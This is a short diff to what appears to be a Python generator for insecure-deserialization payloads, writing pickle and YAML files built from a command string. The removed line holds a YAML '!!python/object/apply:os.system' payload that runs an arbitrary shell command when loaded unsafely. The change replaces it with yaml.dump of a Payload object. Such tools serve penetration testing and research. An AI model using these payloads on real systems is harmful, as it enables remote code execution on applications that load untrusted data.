@@ -6,6 +6,8 @@ import pickle
 import os
 import base64
 import jsonpickle
+import yaml
+
 
 class Payload(object):
 
@@ -20,7 +22,7 @@ class Payload(object):
         open(self.location.__add__("_pick"), "wb").write(by)
 
     def ya(self):
-        by = bytes("!!python/object/apply:os.system ['{}']".format(self.cmd), "utf-8")
+        by = yaml.dump(Payload(self.cmd, self.location, self.base))
         by = self.verifyencoding(by)
         open(self.location.__add__("_yaml"), "wb").write(by)
 
